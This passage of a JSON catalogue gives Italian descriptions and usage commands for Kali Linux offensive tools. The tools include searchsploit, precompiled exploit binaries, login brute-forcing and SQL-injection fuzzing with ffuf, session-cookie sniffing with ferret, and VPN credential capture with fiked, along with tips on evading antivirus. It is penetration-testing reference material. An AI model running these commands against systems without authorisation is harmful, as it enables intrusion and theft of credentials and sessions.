    "desc": "Archivio di exploit binari precompilati pronti all'uso da Exploit-DB per test rapidi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ExploitDB-bin-sploits è un archivio di exploit binari precompilati dal database Exploit-DB. Contiene eseguibili pronti all'uso per varie vulnerabilità, evitando la necessità di compilazione. Utile per test rapidi quando serve un exploit funzionante immediatamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Precompiled:</strong> Binari già compilati per varie piattaforme.</p><p><strong>Indexed:</strong> Organizzati per EDB-ID per facile ricerca.</p><p><strong>Ready to Use:</strong> Nessuna compilazione necessaria.</p><p><strong>Various Platforms:</strong> Windows, Linux, altri OS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># I binari sono in /usr/share/exploitdb-bin-sploits/\nls /usr/share/exploitdb-bin-sploits/\n\n# Cerca per EDB-ID\nfind /usr/share/exploitdb-bin-sploits/ -name \"*1234*\"\n\n# Copia e usa\ncp /usr/share/exploitdb-bin-sploits/bin-sploits/1234.exe .</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Testing</strong>, exploit pronto senza compilazione. Nel <strong>Lab Environment</strong>, testa vulnerabilità rapidamente. <strong>CTF</strong> quando serve exploit veloce.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> Binari pubblici hanno signature AV note. Non usare in engagement reali senza modifica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "exploitdb-papers",
    "name": "exploitdb-papers",
    "version": "20221122",
    "icon": "../app/icons/exploitdb-papers-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb-papers/",
    "desc": "Collezione di whitepaper e documentazione tecnica su vulnerabilità e tecniche di exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ExploitDB-papers è una collezione di whitepaper, documentazione tecnica e articoli su vulnerabilità e tecniche di exploit dal database Exploit-DB. Contiene ricerche sulla sicurezza, write-up di exploit e documentazione di tecniche offensive e difensive.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Research Papers:</strong> Whitepaper su vulnerabilità e tecniche.</p><p><strong>Exploit Write-ups:</strong> Documentazione dettagliata di exploit.</p><p><strong>Technique Docs:</strong> Guide su tecniche offensive.</p><p><strong>Searchable:</strong> Indicizzato per facile ricerca.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Papers sono in /usr/share/exploitdb-papers/\nls /usr/share/exploitdb-papers/\n\n# Cerca per keyword\ngrep -r \"buffer overflow\" /usr/share/exploitdb-papers/\n\n# Cerca con searchsploit\nsearchsploit -p papers/keyword</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Research</strong>, documentazione su vulnerabilità specifiche. Nel <strong>Learning</strong>, studia tecniche di exploit. <strong>Reference</strong> durante sviluppo exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Educational:</strong> Risorsa puramente educativa. Utile per capire vulnerabilità prima di testarle.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "exploitdb",
    "name": "exploitdb",
    "version": "20250827",
    "icon": "../app/icons/exploitdb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb/",
    "desc": "Database locale di exploit pubblici con tool searchsploit per ricerca offline rapida.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ExploitDB è il database locale del famoso Exploit-DB, contenente migliaia di exploit pubblici, shellcode e proof-of-concept. Include searchsploit, un tool da riga di comando per cercare rapidamente exploit per software, versione o CVE. Database essenziale per ogni pentester.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Searchsploit:</strong> Ricerca rapida nel database locale.</p><p><strong>Offline Access:</strong> Funziona senza connessione internet.</p><p><strong>CVE Search:</strong> Cerca per numero CVE.</p><p><strong>Copy/Mirror:</strong> Copia exploit nella directory corrente.</p><p><strong>Regular Updates:</strong> Aggiornabile con searchsploit -u.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca per software con versione esatta\nsearchsploit apache 2.4.49 | grep -i \"remote\\|rce\\|exploit\"\n\n# Cerca CVE con output JSON per automazione\nsearchsploit CVE-2021-44228 --json | jq '.RESULTS_EXPLOIT[].Path'\n\n# Copia exploit in directory corrente\nsearchsploit -m 50383\n\n# Pipeline: nmap version scan -&gt; searchsploit\nnmap -sV target -oX scan.xml\nsearchsploit --nmap scan.xml\n\n# Escludi risultati DOS/denialofservice\nsearchsploit wordpress --exclude=\"dos|Denial\"\n\n# Cerca solo Metasploit modules\nsearchsploit apache -t --id | grep -i metasploit\n\n# Mirror exploit per analisi offline\nsearchsploit -m 50383 -o /tmp/exploits/\n\n# Cerca shellcode\nsearchsploit -s shellcode linux x86\n\n# Aggiorna e verifica ultimo update\nsearchsploit -u &amp;&amp; cat /usr/share/exploitdb/.searchsploit_rc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Vulnerability Assessment</strong>, cerca exploit per software trovato. Nel <strong>Pentest</strong>, trova rapidamente PoC per CVE specifiche. <strong>Research</strong> per studiare vulnerabilità note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Public Exploits:</strong> Signature conosciute dagli AV. Modifica exploit prima dell'uso in engagement reali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "eyewitness",
    "name": "eyewitness",
    "version": "20230525.1",
    "icon": "../app/icons/eyewitness-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eyewitness/",
    "desc": "Cattura screenshot di siti web, RDP e VNC per visual recon rapida su larga scala.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>EyeWitness cattura automaticamente screenshot di siti web, server RDP e VNC per permettere visual reconnaissance rapida su larga scala. Genera report HTML navigabile con tutti gli screenshot, identificando tecnologie, titoli e potenziali target interessanti. Essenziale per triage di grandi quantità di host.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Screenshots:</strong> Cattura pagine HTTP/HTTPS.</p><p><strong>RDP/VNC Support:</strong> Screenshot anche di servizi desktop remoto.</p><p><strong>HTML Reports:</strong> Report navigabile con filtri.</p><p><strong>Technology Detection:</strong> Identifica CMS, framework, server.</p><p><strong>Nmap Integration:</strong> Accetta output XML di Nmap.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Web screenshot da Nmap con tutti i protocolli\neyewitness -x nmap.xml --web --all-protocols --no-prompt -d ./screenshots/\n\n# Bulk screenshot con threads e delay\neyewitness -f urls.txt --web -t 10 --timeout 30 --delay 2\n\n# RDP e VNC screenshot simultanei\neyewitness -f hosts.txt --rdp --vnc -d ./remote_desktop/\n\n# User-agent custom per evasione\neyewitness -f urls.txt --web --user-agent \"Mozilla/5.0 (Windows NT 10.0)\" \n\n# Con proxy e auth\neyewitness -f urls.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080\n\n# Pipeline completa: subfinder -&gt; httpx -&gt; eyewitness\nsubfinder -d target.com -silent | httpx -silent -o live.txt\neyewitness -f live.txt --web -d ./recon_$(date +%Y%m%d)/\n\n# Cicla su ogni screenshot per default creds check\neyewitness -f urls.txt --web --active-scan\n\n# Resume scan interrotto\neyewitness --resume ./ew_scan/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, visual triage di centinaia di web server. Nel <strong>Bug Bounty</strong>, identifica rapidamente target interessanti. <strong>Red Team</strong> per mappare superficie d'attacco visivamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni attive a tutti i target. User-agent identificabile. Genera traffico significativo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "fatcat",
    "name": "fatcat",
    "version": "1.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fatcat/",
    "desc": "Tool forense per analizzare e manipolare filesystem FAT12/FAT16/FAT32 a basso livello.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>FatCat è un tool forense per analisi a basso livello di filesystem FAT (FAT12, FAT16, FAT32). Permette di esplorare la struttura del filesystem, recuperare file cancellati, analizzare cluster chain e manipolare directory entries. Utile per forensics su chiavette USB e schede SD.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>FAT Analysis:</strong> Analizza struttura FAT e cluster allocation.</p><p><strong>Deleted Recovery:</strong> Recupera file cancellati dalle directory.</p><p><strong>Cluster Navigation:</strong> Naviga manualmente la chain dei cluster.</p><p><strong>Raw Access:</strong> Accesso diretto ai settori del disco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza immagine\nfatcat disk.img -l /\n\n# Lista file cancellati\nfatcat disk.img -d\n\n# Recupera file\nfatcat disk.img -r deleted.txt -O recovered.txt\n\n# Info filesystem\nfatcat disk.img -i</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>USB Forensics</strong>, analizza chiavette e schede SD. Nel <strong>Data Recovery</strong>, recupera file cancellati da FAT. <strong>Malware Analysis</strong> su device FAT compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only:</strong> Usa sempre su immagini forensi, non su device originali. Supporta solo FAT, non NTFS o ext.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "fern-wifi-cracker",
    "name": "fern-wifi-cracker",
    "version": "3.5",
    "icon": "../app/icons/fern-wifi-cracker-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fern-wifi-cracker/",
    "desc": "GUI per attacchi WiFi automatizzati: WEP/WPA cracking, WPS attack, session hijacking.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Fern WiFi Cracker è un tool con interfaccia grafica per audit e attacchi su reti wireless. Automatizza cracking di WEP/WPA/WPA2, attacchi WPS, MITM e session hijacking. Scritto in Python con Qt, è accessibile anche a utenti meno esperti grazie all'interfaccia intuitiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WEP Cracking:</strong> Attacco automatico a reti WEP.</p><p><strong>WPA/WPA2:</strong> Cattura handshake e dictionary attack.</p><p><strong>WPS Attack:</strong> Brute force di PIN WPS.</p><p><strong>Session Hijacking:</strong> Cookie hijacking su reti aperte.</p><p><strong>GUI Interface:</strong> Interfaccia grafica user-friendly.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia interfaccia grafica\nfern-wifi-cracker\n\n# Seleziona interfaccia wireless\n# Clicca \"Scan for Access Points\"\n# Seleziona target e tipo di attacco\n# Avvia attacco con wordlist o WPS</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Auditing</strong>, test automatizzato di sicurezza wireless. Nel <strong>Learning</strong>, ottimo per imparare attacchi WiFi con GUI. <strong>Quick Testing</strong> quando serve risultato rapido.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Attività wireless facilmente rilevabile. Richiede hardware compatibile monitor mode.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "feroxbuster",
    "name": "feroxbuster",
    "version": "2.11.0",
    "icon": "../app/icons/feroxbuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/feroxbuster/",
    "desc": "Content discovery tool velocissimo in Rust con ricorsione automatica e filtri avanzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Feroxbuster è un tool di content discovery scritto in Rust, ottimizzato per velocità e affidabilità. Supporta ricorsione automatica, filtri avanzati per status code/dimensioni/parole, backup file detection e resume di scan interrotti. Uno dei fuzzer web più veloci disponibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Speed:</strong> Scritto in Rust per performance massime.</p><p><strong>Auto-Recursion:</strong> Scansione ricorsiva automatica delle directory trovate.</p><p><strong>Smart Filtering:</strong> Filtra per status, size, words, lines, regex.</p><p><strong>Resume Support:</strong> Riprende scan interrotti da dove lasciato.</p><p><strong>Backup Detection:</strong> Cerca automaticamente file di backup.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo con auto-tune e resume\nferoxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -x php,bak,old,html,txt,zip --auto-tune -o ferox_results.txt --resume-from ferox.state\n\n# Filtra per size e status, ignora errori\nferoxbuster -u https://target.com -C 404,403,500 -S 0 --filter-similar-to \"Page not found\"\n\n# Ricorsione limitata con depth\nferoxbuster -u https://target.com -d 3 --dont-scan /logout,/signout\n\n# Con headers e cookie autenticazione\nferoxbuster -u https://target.com -H \"Authorization: Bearer TOKEN\" \\\n  -H \"Cookie: session=abc123\" -b \"PHPSESSID=xyz789\"\n\n# Parallel scan di multipli URL\nferoxbuster --stdin &lt; urls.txt -w wordlist.txt --parallel 5\n\n# Backup file detection avanzato\nferoxbuster -u https://target.com --collect-backups --collect-extensions\n\n# JSON output per integrazione\nferoxbuster -u https://target.com --json -o results.json\n\n# Via proxy per Burp analysis\nferoxbuster -u https://target.com -p http://127.0.0.1:8080 -k</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trova file e directory nascosti velocemente. Nel <strong>Bug Bounty</strong>, scansione rapida di grandi scope. <strong>Pentest</strong> per enumerazione web completa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Genera molte request, facilmente loggabile. Rate limiting consigliato su target di produzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "ferret-sidejack",
    "name": "ferret-sidejack",
    "version": "3.0.1",
    "icon": "../app/icons/ferret-sidejack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ferret-sidejack/",
    "desc": "Estrae cookie di sessione dal traffico di rete per session hijacking attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ferret è uno sniffer specializzato nell'estrazione di cookie di sessione dal traffico di rete. Cattura cookie da HTTP non cifrato per permettere session hijacking (sidejacking). Utilizzato insieme a Hamster, permette di impersonare sessioni web catturate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cookie Sniffing:</strong> Cattura cookie da traffico HTTP.</p><p><strong>Session Extraction:</strong> Estrae session ID per hijacking.</p><p><strong>PCAP Support:</strong> Analizza anche file di cattura.</p><p><strong>Hamster Integration:</strong> Output compatibile con proxy Hamster.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura su interfaccia\nferret -i eth0\n\n# Da file pcap\nferret -r capture.pcap\n\n# Output per Hamster\nferret -i eth0 -o cookies.txt\n\n# Poi usa Hamster per replay\nhamster</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Session Hijacking</strong>, impersona utenti su reti non cifrate. Nel <strong>WiFi Testing</strong>, dimostra rischi di WiFi pubblici. <strong>Awareness</strong> sull'importanza di HTTPS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitato:</strong> Inefficace su HTTPS. Richiede posizione MITM o accesso al traffico. Tool datato ma ancora utile per demo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "ffuf",
    "name": "ffuf",
    "version": "2.1.0",
    "icon": "../app/icons/ffuf-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ffuf/",
    "desc": "Fuzzer web velocissimo in Go per directory, parametri, vhost e qualsiasi punto di injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>FFUF (Fuzz Faster U Fool) è un web fuzzer estremamente veloce scritto in Go. Permette fuzzing di qualsiasi parte di una request HTTP: URL, parametri GET/POST, header, cookie, vhost. La keyword FUZZ indica dove inserire i payload dalla wordlist. Tool di riferimento per content discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Universal Fuzzing:</strong> Fuzz qualsiasi parte della request.</p><p><strong>Filter/Match:</strong> Filtra risultati per status, size, words, lines, time, regex.</p><p><strong>Multiple Keywords:</strong> Usa FUZZ, FUZZ2, etc. per fuzzing multiplo.</p><p><strong>Recursion:</strong> Ricorsione automatica opzionale.</p><p><strong>Output Formats:</strong> JSON, CSV, HTML per integrazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory fuzzing con auto-calibration e estensioni\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -e .php,.html,.txt,.bak -ac -recursion -recursion-depth 2\n\n# VHost enumeration con filter dinamico\nffuf -u http://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -fs 0 -mc all\n\n# POST parameter fuzzing per SQLi\nffuf -u https://target.com/login -X POST -d \"user=admin&amp;pass=FUZZ\" \\\n  -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -fr \"error|syntax|mysql\"\n\n# Multi-keyword fuzzing (username:password)\nffuf -u https://target.com/login -X POST -d \"user=FUSER&amp;pass=FPASS\" \\\n  -w users.txt:FUSER -w passwords.txt:FPASS -fc 401 -mode clusterbomb\n\n# API endpoint discovery con autenticazione\nffuf -u https://api.target.com/v1/FUZZ -w api_endpoints.txt \\\n  -H \"Authorization: Bearer TOKEN\" -mc 200,201,401 -o api_results.json -of json\n\n# Rate limited scan via proxy\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -p 0.5 \\\n  -x http://127.0.0.1:8080 -replay-proxy http://127.0.0.1:8080\n\n# Match response time per timing attacks\nffuf -u https://target.com/api?id=FUZZ -w nums.txt -ft \"&gt;500\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trova directory e file nascosti. Nel <strong>Bug Bounty</strong>, enumera parametri e vhost. <strong>Pentest</strong> per fuzzing completo di applicazioni web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Molte request in poco tempo. Usa -rate per limitare velocità. User-agent modificabile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "fierce",
    "name": "fierce",
    "version": "1.6.0",
    "icon": "../app/icons/fierce-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fierce/",
    "desc": "Scanner DNS per trovare target non contigui e spazio IP associato a un dominio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Fierce è uno scanner DNS per ricognizione che cerca di mappare lo spazio IP non contiguo associato a un dominio. Usa DNS query per trovare server e host che potrebbero non essere ovvi, inclusi server in range IP diversi dal blocco principale dell'organizzazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Transfer:</strong> Tenta AXFR come primo step.</p><p><strong>Subdomain Brute:</strong> Brute force di subdomain comuni.</p><p><strong>Reverse Lookup:</strong> Cerca altri host nei range IP trovati.</p><p><strong>Wildcard Detection:</strong> Identifica DNS wildcard.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\nfierce --domain target.com\n\n# Con wordlist custom\nfierce --domain target.com --subdomain-file subs.txt\n\n# Range scan esteso\nfierce --domain target.com --wide\n\n# Output file\nfierce --domain target.com --file output.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, trova host in range IP non contigui. Nel <strong>Pentest</strong>, mappa infrastruttura completa del target. Utile quando il target ha infrastruttura distribuita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> Tool più moderni come amass sono più completi. Query DNS facilmente loggabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "fiked",
    "name": "fiked",
    "version": "0.0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fiked/",
    "desc": "Fake IKE daemon per intercettare credenziali VPN IPsec in attacchi MITM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Fiked (Fake IKE Daemon) emula un gateway VPN IPsec per attacchi man-in-the-middle. Intercetta connessioni VPN client e cattura credenziali di autenticazione (PSK, XAUTH username/password). Utile per testing di VPN in ambienti controllati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IKE Emulation:</strong> Emula gateway IKE per VPN.</p><p><strong>PSK Capture:</strong> Cattura Pre-Shared Keys.</p><p><strong>XAUTH Harvest:</strong> Raccoglie username e password XAUTH.</p><p><strong>Aggressive Mode:</strong> Sfrutta IKE aggressive mode.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia fake gateway\nfiked -g gateway_ip -k 500\n\n# Con logging verboso\nfiked -g 192.168.1.1 -k 500 -v\n\n# Specifica interfaccia\nfiked -g gateway -k 500 -i eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VPN Testing</strong>, testa resistenza a MITM di VPN IPsec. Nel <strong>Red Team</strong>, cattura credenziali VPN in rete compromessa. <strong>Awareness</strong> su rischi di IKE aggressive mode.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisiti:</strong> Richiede posizione MITM. IPsec moderno con IKEv2 e certificati non è vulnerabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "finalrecon",
    "name": "finalrecon",
    "version": "1.1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/finalrecon/",
    "desc": "Tool OSINT all-in-one per ricognizione web: whois, header, SSL, crawler, subdomain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>FinalRecon è un tool OSINT all-in-one per ricognizione web automatizzata. Combina whois lookup, analisi header, info certificato SSL, web crawling, enumerazione subdomain e wayback machine in un unico strumento. Genera report comprensivi per assessment rapidi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WHOIS:</strong> Lookup informazioni registrazione dominio.</p><p><strong>SSL Analysis:</strong> Estrae info da certificati SSL.</p><p><strong>Header Analysis:</strong> Analizza header HTTP per info.</p><p><strong>Subdomain Enum:</strong> Cerca subdomain da fonti multiple.</p><p><strong>Web Crawling:</strong> Crawla il sito per URL e risorse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nfinalrecon --full https://target.com\n\n# Solo header e SSL\nfinalrecon --headers --sslinfo https://target.com\n\n# Subdomain\nfinalrecon --sub https://target.com\n\n# Export output\nfinalrecon --full https://target.com -o report.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Recon</strong>, assessment iniziale rapido di un target. Nel <strong>Bug Bounty</strong>, raccolta info veloce su nuovo scope. <strong>OSINT</strong> per profiling base di organizzazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Alcune funzioni sono attive (crawl). WHOIS e SSL sono passive. Lascia log sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "findomain",
    "name": "findomain",
    "version": "10.0.1",
    "icon": "../app/icons/findomain-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/findomain/",
    "desc": "Enumerazione sottodomini velocissima usando API multiple (CT logs, DNS, scraping).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Findomain è un tool di subdomain enumeration estremamente veloce scritto in Rust. Interroga multiple fonti (Certificate Transparency logs, API di servizi DNS, motori di ricerca) per trovare subdomain senza brute forcing. Supporta monitoring continuo e notifiche per nuovi subdomain.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Usa 10+ fonti per enumerazione.</p><p><strong>CT Logs:</strong> Cerca in Certificate Transparency logs.</p><p><strong>High Speed:</strong> Scritto in Rust per performance.</p><p><strong>Monitoring:</strong> Monitora nuovi subdomain nel tempo.</p><p><strong>Resolution:</strong> Risolve subdomain trovati opzionalmente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera con risoluzione e output multipli\nfindomain -t target.com -r -o --output-file subs.txt\n\n# Bulk scan da lista domini\nfindomain -f domains.txt -r -u subdomains.txt\n\n# Con tutte le API configurate\nexport SPYSE_TOKEN=xxx\nexport VIRUSTOTAL_TOKEN=xxx\nfindomain -t target.com -r\n\n# Monitoring con webhook notifiche\nfindomain -t target.com --monitoring \\\n  --discord-webhook \"https://discord.com/api/webhooks/xxx\"\n\n# Pipeline completa: enum -&gt; probe -&gt; scan\nfindomain -t target.com -q -r | httpx -silent | nuclei -t cves/\n\n# Solo IP unique (no duplicati)\nfindomain -t target.com -r --ip-only | sort -u\n\n# Export JSON per analisi\nfindomain -t target.com -r -o --json\n\n# Esclusione pattern\nfindomain -t target.com --exclude \"test,dev,staging\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Discovery</strong>, alternativa veloce a subfinder/amass. Nel <strong>Bug Bounty</strong>, enumerazione rapida di nuovi scope. <strong>Monitoring</strong> per asset discovery continua.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Non genera traffico verso il target direttamente. Query a servizi terzi potrebbero essere loggabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "firewalk",
    "name": "firewalk",
    "version": "5.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/firewalk/",
    "desc": "Determina regole firewall analizzando risposte TTL per mappare ACL di gateway.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Firewalk è un tool di network reconnaissance che determina quali porte sono permesse attraverso un firewall. Usa la tecnica di IP TTL manipulation: invia pacchetti con TTL impostato per scadere appena oltre il firewall, analizzando le risposte per capire se il pacchetto è passato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ACL Mapping:</strong> Mappa regole firewall analizzando risposte.</p><p><strong>TTL Analysis:</strong> Usa TTL per determinare passaggio pacchetti.</p><p><strong>Port Scanning:</strong> Verifica porte aperte sul firewall.</p><p><strong>Protocol Support:</strong> TCP e UDP scanning.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base (gateway, target)\nfirewalk -S1-1000 -i eth0 gateway_ip target_ip\n\n# UDP scan\nfirewalk -S1-1000 -i eth0 -pUDP gateway target\n\n# Verbose\nfirewalk -S1-1000 -i eth0 -v gateway target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Firewall Testing</strong>, mappa regole ACL. Nel <strong>Pentest</strong>, identifica porte permesse attraverso perimetro. <strong>Network Security</strong> per audit configurazione firewall.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Pacchetti con TTL anomali possono essere rilevati. Alcuni firewall non rispondono in modo prevedibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "foremost",
    "name": "foremost",
    "version": "1.5.7",
    "icon": "../app/icons/foremost-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/foremost/",
    "desc": "File carving tool forense per recuperare file da immagini disco basandosi su header.",
